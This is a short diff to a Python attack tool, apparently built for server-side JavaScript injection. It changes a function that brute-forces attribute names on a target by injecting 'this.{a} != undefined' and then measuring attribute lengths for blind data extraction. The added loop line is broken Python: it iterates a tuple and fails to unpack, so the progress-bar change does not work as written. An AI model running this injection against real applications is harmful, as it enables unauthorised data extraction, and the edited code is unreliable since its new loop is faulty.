@@ -28,13 +28,15 @@ def SSJI_brute_attribute_names(attack_target, extraction_point):
         exit()
     attributes_list.add(attack_target.scan_param_name)
     found_attributes = []    
-    for a in attributes_list:       
+    
+    for a, counter in attributes_list, range(len(attributes_list)):       
         extraction_payload = f'this.{a} != undefined'        
         if send_extraction_request(attack_target, extraction_point, extraction_payload):            
             attr_length = SSJI_get_extraction_parameter_length(attack_target,attack_target.scan_param_name, attack_target.baseline_response, extraction_point, a)
             if attr_length:
                 found_attributes.append([a,attr_length])
                 print(f"\t[+] Found attribute: {a} with length {attr_length}")
+        progress_bar(counter, len(attributes_list))
     return found_attributes
 
 def SSJI_get_extraction_parameter_length(attack_target,insertion_param_name, default_response, extraction_point, extraction_attribute_name):    
